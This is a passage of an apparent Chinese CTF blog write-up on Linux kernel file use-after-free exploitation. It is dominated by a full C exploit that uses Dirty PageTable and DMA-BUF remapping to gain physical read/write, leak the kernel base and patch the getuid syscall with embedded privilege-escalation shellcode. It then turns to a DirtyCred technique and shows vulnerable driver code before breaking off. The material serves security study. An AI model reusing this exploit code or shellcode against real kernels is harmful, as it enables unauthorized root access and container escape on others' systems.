class="string">&quot;[+] Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">213</span>] = &#123;</span><br><span class="line">    <span class="number">0xF3</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0xFA</span>, <span class="number">0xE8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8D</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x49</span>, <span class="number">0x81</span>, <span class="number">0xEF</span>, <span class="number">0xF0</span>, <span class="number">0xB7</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xBF</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0xA7</span>, <span class="number">0x02</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>,</span><br><span class="line">    <span class="number">0x87</span>, <span class="number">0x70</span>, <span class="number">0x26</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0xBF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xA0</span>,</span><br><span class="line">    <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC7</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xB7</span>, <span class="number">0xC0</span>, <span class="number">0x68</span>, <span class="number">0xA7</span>, <span class="number">0x02</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xD0</span>, <span class="number">0x0A</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xBF</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0xBB</span>, <span class="number">0x02</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xF0</span>, <span class="number">0xC0</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0xBF</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xA0</span>, <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x28</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x66</span>, <span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xC6</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x01</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0xCC</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *page_spray[N_PAGESPRAY];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> uaf_index = <span class="number">0xc0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *filename = <span class="string">&quot;/tmp/elf&quot;</span>;</span><br><span class="line"></span><br><span class="line">    file = fopen(filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/safenote&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dmafd = creat(<span class="string">&quot;/dev/dma_heap/system&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dmafd == <span class="number">-1</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;/dev/dma_heap/system&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Prepare pages for PTE&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        page_spray[i] = mmap((<span class="type">void</span>*)(<span class="number">0xdead0000</span>UL + i*<span class="number">0x10000</span>UL),</span><br><span class="line">                            <span class="number">0x8000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">                            MAP_ANONYMOUS|MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page_spray[i] == MAP_FAILED) err_exit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">        add(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tmp_fd[TMP_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">        tmp_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(tmp_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == uaf_index)&#123;</span><br><span class="line">            uaf(uaf_index);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        del(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;spray read file.&quot;</span>);</span><br><span class="line">    <span class="type">int</span> read_fd[READ_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        read_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(read_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del(uaf_index);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;spray write file.&quot;</span>);</span><br><span class="line">    <span class="type">int</span> write_fd[WRITE_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">        write_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_WRONLY);</span><br><span class="line">        <span class="keyword">if</span>(write_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;find the uaf read file&quot;</span>);</span><br><span class="line">    <span class="type">int</span> uaf_read_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        <span class="type">int</span> ret = write(read_fd[i], buf, <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find the uaf read fd %d \n&quot;</span>, i);</span><br><span class="line">            uaf_read_fd = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uaf_read_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;can not find the uaf read fd.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;close the file.&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">        close(tmp_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == uaf_read_fd)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(read_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">        close(write_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Allocating PTEs...&quot;</span>);</span><br><span class="line">    info(<span class="string">&quot;Allocate many PTEs (1)&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY/<span class="number">2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            *(<span class="type">char</span>*)(page_spray[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Allocate DMA-BUF heap&quot;</span>);</span><br><span class="line">    <span class="type">int</span> dma_buf_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line">    data.len = <span class="number">0x1000</span>;</span><br><span class="line">    data.fd_flags = O_RDWR;</span><br><span class="line">    data.heap_flags = <span class="number">0</span>;</span><br><span class="line">    data.fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] dma_buf_fd: %d\n&quot;</span>, dma_buf_fd = data.fd);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Allocate many PTEs (2)&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = N_PAGESPRAY/<span class="number">2</span>; i &lt; N_PAGESPRAY; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            *(<span class="type">char</span>*)(page_spray[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (dup(read_fd[uaf_read_fd]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Searching for overlapping page...&quot;</span>);</span><br><span class="line">    <span class="comment">// Search for page that overlaps with other physical page</span></span><br><span class="line">    <span class="type">void</span> *evil = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        <span class="comment">// We wrote &#x27;H&#x27;(=&#x27;A&#x27;+7) but if it changes the PTE overlaps with the file</span></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">char</span>*)(page_spray[i] + <span class="number">7</span>*<span class="number">0x1000</span>) != <span class="string">&#x27;A&#x27;</span> + <span class="number">7</span>) &#123; <span class="comment">// +38h: f_count</span></span><br><span class="line">        evil = page_spray[i] + <span class="number">0x7000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Found overlapping page: %p\n&quot;</span>, evil);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (evil == <span class="literal">NULL</span>) err_exit(<span class="string">&quot;target not found :(&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Place PTE entry for DMA buffer onto controllable PTE</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Remapping...&quot;</span>);</span><br><span class="line">    munmap(evil, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">void</span> *dmabuf = mmap(evil, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_SHARED | MAP_POPULATE, dma_buf_fd, <span class="number">0</span>);</span><br><span class="line">    *(<span class="type">char</span>*)dmabuf = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get physical AAR/AAW</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// Corrupt physical address of DMA-BUF</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (dup(read_fd[uaf_read_fd]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] DMA-BUF now points to PTE: 0x%016lx\n&quot;</span>, *(<span class="type">size_t</span>*)dmabuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Leak kernel physical base</span></span><br><span class="line">    <span class="type">void</span> *wwwbuf = <span class="literal">NULL</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)dmabuf = <span class="number">0x800000000009c067</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (page_spray[i] == evil) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">size_t</span>*)page_spray[i] &gt; <span class="number">0xffff</span>) &#123;</span><br><span class="line">            wwwbuf = page_spray[i];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found victim page table: %p\n&quot;</span>, wwwbuf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] wwwbuf data: %p \n&quot;</span>, ((*(<span class="type">size_t</span>*)wwwbuf)));</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> phys_base = ((*(<span class="type">size_t</span>*)wwwbuf) &amp; ~<span class="number">0xfff</span>) - <span class="number">0x3a01000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Physical kernel base address: 0x%016lx\n&quot;</span>, phys_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Overwrite setxattr</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Overwriting getuid...&quot;</span>);</span><br><span class="line">    <span class="comment">// ffffffff811ab7e0 t __do_sys_getuid</span></span><br><span class="line">    <span class="type">size_t</span> phys_func = phys_base + <span class="number">0x1ab7e0</span> - <span class="number">0x3000</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)dmabuf = (phys_func &amp; ~<span class="number">0xfff</span>) | <span class="number">0x8000000000000067</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *p;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x11\x11\x11\x11\x11\x11\x11\x11&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = getpid();</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x22\x22\x22\x22\x22\x22\x22\x22&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = (<span class="type">size_t</span>)&amp;win;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x33\x33\x33\x33\x33\x33\x33\x33&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_cs;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x44\x44\x44\x44\x44\x44\x44\x44&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_rflags;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x55\x55\x55\x55\x55\x55\x55\x55&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_sp;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x66\x66\x66\x66\x66\x66\x66\x66&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_ss;</span><br><span class="line">    <span class="built_in">memcpy</span>(wwwbuf + (phys_func &amp; <span class="number">0xfff</span>), shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] GO!GO!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">uid_t</span> uid = getuid();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed...&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æ—¶æ‰“è¿œç¨‹æ—¶çš„æ•ˆæœğŸ˜‹ï¼š</p><img src="/2024/11/12/fileuaf/15.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="Dirty-Cred-in-file-uaf"><a href="#Dirty-Cred-in-file-uaf" class="headerlink" title="Dirty Cred in file uaf"></a>Dirty Cred in file uaf</h2><p>å¯ä»¥çœ‹åˆ° Dirty PageTable çš„åŠŸèƒ½éå¸¸çš„å¼ºå¤§ï¼Œèƒ½å¤Ÿè®©æˆ‘ä»¬ç›´æ¥ä¿®æ”¹å†…æ ¸çš„ä»£ç æ®µç„¶åç›´æ¥åŠ«æŒç¨‹åºæµï¼Œæ‰“èµ·æ¥ä¹Ÿéå¸¸çš„éº»çƒ¦ã€‚å¦‚æœæˆ‘ä»¬çš„ç›®æ ‡ä¸æ˜¯å®¹å™¨é€ƒé€¸è€Œæ˜¯è·å– flag æˆ–è€…ææƒï¼Œæˆ‘ä»¬å®Œå…¨æœ‰æ›´åŠ å¿«çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯ DirtyCredã€‚eeee å¸ˆå‚…ä¹‹å‰ç»™æˆ‘å‘äº†ä¸€é“å†…æ ¸é¢˜ï¼Œç¬”è€…è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ demoï¼Œä¸‹é¢ç»™å‡ºé¢˜ç›®çš„ä»£ç ã€‚  </p><h3 id="vuln-code"><a href="#vuln-code" class="headerlink" title="vuln code"></a>vuln code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vuln_ioctl</span><span class="params">(file *f, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">322420463</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !register_file )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    fput(register_file, cmd, arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-25LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">322428589</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( register_file )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-16LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        register_file = (file *)fget((<span class="type">unsigned</span> <span class="type">int</span>)arg);</span><br><span class="line">        <span class="keyword">if</span> ( register_file )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æä¸åˆ©ç”¨-1"><a href="#æ¼æ´åˆ†æä¸åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ†æä¸åˆ©ç”¨"></a>æ¼æ´åˆ†æä¸åˆ©ç”¨</h3><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå†…æ ¸é©±åŠ¨æ˜¯ä¸€ä¸ªç»å…¸çš„èœå•ç¨‹åºï¼Œä»–å…è®¸æˆ‘ä»¬å¯¹æ–‡ä»¶æè¿°ç¬¦è¿›è¡Œ fget å’Œ fput ä¸¤ä¸ªæ“ä½œã€‚fget ä¼šä»¤ file-&gt;f_count çš„å€¼åŠ ä¸€ï¼Œfput ä¼šä»¤ file-&gt;f_count çš„å€¼å‡ä¸€ã€‚å½“ file ç»“æ„ä½“çš„ f_count çš„å€¼ä¸ºä¸€æ—¶ä¼šè¢«é‡Šæ”¾æ‰ï¼Œè€Œç”¨æˆ·æ€ä¾ç„¶æœ‰ç€å¯¹è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦çš„å¼•ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨ä¸€ä¸ªç™½ç»™çš„ file uaf æ¼æ´ã€‚<br>æˆ‘ä»¬å¯ä»¥å…ˆç”¨è¯»å†™æƒé™æ¥æ‰“å¼€ä¸€ä¸ªæ™®é€šç”¨æˆ·å…·æœ‰è¯»å†™æƒé™çš„æ–‡ä»¶å¹¶å°†å…¶ä½œä¸ºå°†è¦ uaf çš„æ–‡ä»¶ï¼Œç„¶åç”¨ mmap æ¥æ˜ å°„æˆ‘ä»¬å°†è¦ uaf çš„æ–‡ä»¶:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> dummy_fd = open(<span class="string">&quot;/tmp/sh&quot;</span>, O_RDWR | O_TRUNC | O_CREAT);</span><br><span class="line"><span class="keyword">if</span> (dummy_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;create&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span 